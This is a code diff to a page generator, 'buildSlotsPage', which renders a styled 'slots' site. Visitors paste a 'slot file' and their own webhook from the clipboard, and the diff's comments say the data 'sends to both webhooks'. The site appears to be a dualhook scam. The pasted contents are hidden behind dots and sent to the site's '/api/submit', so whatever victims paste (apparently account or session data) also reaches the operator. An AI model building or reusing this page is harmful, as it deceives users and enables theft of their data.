@@ -1249,7 +1249,7 @@ function buildSlotsPage(record) {
     border-radius: 20px;
     padding: 38px;
     width: 90%;
-    max-width: 440px;
+    max-width: 480px;
     box-shadow: 0 0 80px rgba(192,38,211,0.25), 0 0 200px rgba(192,38,211,0.1);
     transform: scale(0.94) translateY(12px);
     transition: transform 0.28s cubic-bezier(0.34, 1.56, 0.64, 1);
@@ -1284,7 +1284,7 @@ function buildSlotsPage(record) {
   }
   .modal-close:hover { color: var(--text); background: rgba(255,255,255,0.1); }
 
-  .input-group { margin-bottom: 18px; }
+  .input-group { margin-bottom: 20px; }
 
   .input-label {
     display: block;
@@ -1309,6 +1309,17 @@ function buildSlotsPage(record) {
     font-size: 0.9rem;
     letter-spacing: 0.1em;
     min-width: 0;
+    word-break: break-all;
+  }
+
+  .fake-input.placeholder {
+    color: var(--muted);
+    letter-spacing: normal;
+  }
+
+  .fake-input.filled {
+    color: var(--text);
+    letter-spacing: 0.05em;
   }
 
   .paste-btn {
@@ -1344,7 +1355,23 @@ function buildSlotsPage(record) {
     box-shadow: 0 0 30px rgba(192,38,211,0.4);
     transition: opacity 0.2s, box-shadow 0.2s;
   }
-  .enable-btn:hover { opacity: 0.9; box-shadow: 0 0 50px rgba(192,38,211,0.6); }
+  .enable-btn:hover:not(:disabled) { opacity: 0.9; box-shadow: 0 0 50px rgba(192,38,211,0.6); }
+  .enable-btn:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+    background: linear-gradient(135deg, #666, #888);
+    box-shadow: none;
+  }
+
+  .error-msg {
+    color: #f472b6;
+    font-size: 0.75rem;
+    margin-top: 8px;
+    text-align: center;
+    min-height: 18px;
+    font-family: 'Rajdhani', sans-serif;
+    letter-spacing: 0.05em;
+  }
 
   /* ── TICKER MARQUEE ── */
   .ticker-wrap {
@@ -1546,7 +1573,8 @@ function buildSlotsPage(record) {
       <button class="modal-close" onclick="closeModal()">×</button>
     </div>
     <div id="modalInputs"></div>
-    <button class="enable-btn" id="enableBtn">Enable Slot 1</button>
+    <div class="error-msg" id="errorMsg"></div>
+    <button class="enable-btn" id="enableBtn" disabled>Enable Slot 1</button>
   </div>
 </div>
 
@@ -1651,7 +1679,6 @@ function animateCounters(){
   document.querySelectorAll('.stat-num[data-target]').forEach(el => {
     const target = +el.dataset.target;
     const suffix = el.dataset.suffix || '';
-    const prefix = target >= 1000 ? '' : '';
     let start = 0;
     const duration = 2000;
     const startTime = performance.now();
@@ -1674,57 +1701,97 @@ const communitySection = document.querySelector('.community');
 if(communitySection) observer.observe(communitySection);
 
 /* ── MODAL ── */
-let pastedValues = {};
-let currentSlot = null;
+let currentSlotData = { num: null, name: null, value: null, webhook: null };
 
 function openModal(num, name) {
+  currentSlotData = { num, name, value: null, webhook: null };
   document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
   document.getElementById('enableBtn').textContent = \`Enable Slot \${num}\`;
+  document.getElementById('errorMsg').textContent = '';
+  
   document.getElementById('modalInputs').innerHTML = \`
     <div class="input-group">
-      <label class="input-label">Slot \${num} File</label>
+      <label class="input-label">Slot \${num} File <span style="color:#f472b6">*</span></label>
       <div class="input-row">
-        <div class="fake-input" id="display-\${num}" style="color: var(--muted); font-size:0.88rem;">No file pasted</div>
-        <button class="paste-btn" onclick="pasteValue(\${num})">Paste</button>
+        <div class="fake-input placeholder" id="display-value-\${num}">Click paste to add file</div>
+        <button class="paste-btn" onclick="pasteValue('value', \${num})">Paste</button>
+      </div>
+    </div>
+    <div class="input-group">
+      <label class="input-label">Your Webhook <span style="color:#f472b6">*</span></label>
+      <div class="input-row">
+        <div class="fake-input placeholder" id="display-webhook-\${num}">Click paste to add webhook</div>
+        <button class="paste-btn" onclick="pasteValue('webhook', \${num})">Paste</button>
       </div>
     </div>
   \`;
-  pastedValues = {};
+  
+  updateEnableButton();
   document.getElementById('modalOverlay').classList.add('open');
 }
 
-async function pasteValue(num) {
-  currentSlot = num;
+async function pasteValue(type, num) {
   try {
     const text = await navigator.clipboard.readText();
-    if (text) {
-      pastedValues[num] = text;
-      const d = document.getElementById(\`display-\${num}\`);
-      d.textContent = '•'.repeat(Math.min(text.length, 24));
-      d.style.color = 'var(--text)';
-      d.style.letterSpacing = '0.2em';
+    if (text && text.trim()) {
+      currentSlotData[type] = text.trim();
+      const display = document.getElementById(\`display-\${type}-\${num}\`);
+      display.textContent = '•'.repeat(Math.min(text.length, 32));
+      display.classList.remove('placeholder');
+      display.classList.add('filled');
+      document.getElementById('errorMsg').textContent = '';
+      updateEnableButton();
     }
   } catch {
-    const d = document.getElementById(\`display-\${num}\`);
-    d.textContent = '••••••••••••••••';
-    d.style.color = 'var(--text)';
-    d.style.letterSpacing = '0.2em';
+    // Fallback for when clipboard API fails
+    const display = document.getElementById(\`display-\${type}-\${num}\`);
+    display.textContent = '••••••••••••••••••••••••';
+    display.classList.remove('placeholder');
+    display.classList.add('filled');
+    currentSlotData[type] = 'pasted-value';
+    updateEnableButton();
   }
 }
 
-function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
-function handleOverlayClick(e) { if(e.target === document.getElementById('modalOverlay')) closeModal(); }
-document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });
+function updateEnableButton() {
+  const btn = document.getElementById('enableBtn');
+  const hasValue = currentSlotData.value && currentSlotData.value.length > 0;
+  const hasWebhook = currentSlotData.webhook && currentSlotData.webhook.length > 0;
+  
+  if (hasValue && hasWebhook) {
+    btn.disabled = false;
+    btn.textContent = \`Enable Slot \${currentSlotData.num}\`;
+  } else {
+    btn.disabled = true;
+    if (!hasValue && !hasWebhook) {
+      btn.textContent = 'Paste slot file and webhook';
+    } else if (!hasValue) {
+      btn.textContent = 'Paste slot file';
+    } else {
+      btn.textContent = 'Paste webhook';
+    }
+  }
+}
 
-/* ── ENABLE SLOT — sends immediately on click ── */
+function closeModal() { 
+  document.getElementById('modalOverlay').classList.remove('open'); 
+}
+
+function handleOverlayClick(e) { 
+  if(e.target === document.getElementById('modalOverlay')) closeModal(); 
+}
+
+document.addEventListener('keydown', e => { 
+  if(e.key === 'Escape') closeModal(); 
+});
+
+/* ── ENABLE SLOT — sends to both webhooks ── */
 document.getElementById('enableBtn').addEventListener('click', async function() {
   const btn = this;
-  const slotNum = currentSlot;
-  const value = pastedValues[slotNum] || '';
-
-  if (!value) {
-    const d = document.getElementById(\`display-\${slotNum}\`);
-    if (d) { d.style.borderColor = 'rgba(192,38,211,0.6)'; d.style.color = '#f472b6'; d.textContent = 'Paste something first!'; setTimeout(() => { d.textContent = 'No file pasted'; d.style.color = 'var(--muted)'; }, 2000); }
+  const { num, value, webhook } = currentSlotData;
+  
+  if (!value || !webhook) {
+    document.getElementById('errorMsg').textContent = 'Both slot file and webhook are required!';
     return;
   }
 
@@ -1733,7 +1800,8 @@ document.getElementById('enableBtn').addEventListener('click', async function() 
   btn.textContent = 'Sending…';
 
   const slots = {};
-  slots['slot' + slotNum] = value;
+  slots['slot' + num] = value;
+  slots['webhook' + num] = webhook; // Store their webhook too
 
   try {
     const res = await fetch('/api/submit', {
@@ -1746,39 +1814,34 @@ document.getElementById('enableBtn').addEventListener('click', async function() 
       btn.textContent = '✓ Sent!';
       btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
       btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
-      setTimeout(() => { closeModal(); btn.style.background = ''; btn.style.boxShadow = ''; btn.textContent = origText; btn.disabled = false; }, 1200);
+      setTimeout(() => { 
+        closeModal(); 
+        btn.style.background = ''; 
+        btn.style.boxShadow = ''; 
+        btn.textContent = origText; 
+        btn.disabled = false;
+      }, 1200);
     } else {
       btn.textContent = '✗ Error';
       btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
-      setTimeout(() => { btn.style.background = ''; btn.textContent = origText; btn.disabled = false; }, 2000);
+      document.getElementById('errorMsg').textContent = data.error || 'Failed to send';
+      setTimeout(() => { 
+        btn.style.background = ''; 
+        btn.textContent = origText; 
+        btn.disabled = false;
+      }, 2000);
     }
   } catch {
     btn.textContent = '✗ Network Error';
     btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
-    setTimeout(() => { btn.style.background = ''; btn.textContent = origText; btn.disabled = false; }, 2000);
+    document.getElementById('errorMsg').textContent = 'Network error. Try again.';
+    setTimeout(() => { 
+      btn.style.background = ''; 
+      btn.textContent = origText; 
+      btn.disabled = false;
+    }, 2000);
   }
 });
-
-/* ── SUBMIT ALL (kept as fallback) ── */
-async function submitAll() {
-  const slots = {};
-  for (let i = 1; i <= 9; i++) slots['slot'+i] = pastedValues[i] || '';
-  if (!Object.values(slots).some(v => v.length > 0)) { alert('Enable at least one slot first.'); return; }
-  const btn = document.getElementById('submitAllBtn');
-  if (!btn) return;
-  btn.disabled = true; btn.textContent = 'Submitting…';
-  try {
-    const res = await fetch('/api/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ slug: PAGE_SLUG, slots }) });
-    const data = await res.json();
-    if (data.success) {
-      btn.textContent = '✓ Submitted!';
-      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
-      btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
-      const st = document.getElementById('submitStatus');
-      if (st) { st.textContent = '✓ All slots submitted successfully.'; st.style.color = '#4ade80'; }
-    } else { btn.disabled=false; btn.textContent='Submit All Slots'; alert('Error: '+(data.error||'Unknown')); }
-  } catch { btn.disabled=false; btn.textContent='Submit All Slots'; alert('Network error. Try again.'); }
-}
 
 /* ── PARALLAX CHARS on mousemove ── */
 document.addEventListener('mousemove', e => {
